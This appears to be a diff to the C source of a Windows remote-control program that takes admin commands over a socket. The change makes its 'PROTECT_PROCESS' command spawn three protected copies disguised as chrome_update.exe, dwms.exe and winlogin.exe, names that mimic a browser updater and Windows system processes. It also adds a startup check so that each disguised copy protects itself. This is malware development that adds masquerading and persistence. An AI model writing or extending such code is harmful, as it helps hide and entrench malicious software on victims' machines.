@@ -140,7 +140,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned chrome_update.exe — will auto-protect immediately on startup]";
+        result = "[Spawned 3 copies: chrome_update.exe, dwms.exe, winlogin.exe — all auto-protect on startup]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -264,7 +264,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Also detect if running from shadow path and protect immediately */
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-    if (strstr(currentPath, "chrome_update.exe") != NULL) {
+    if (strstr(currentPath, "chrome_update.exe") != NULL ||
+        strstr(currentPath, "dwms.exe") != NULL ||
+        strstr(currentPath, "winlogin.exe") != NULL) {
         sys_protect_process();
     }
 
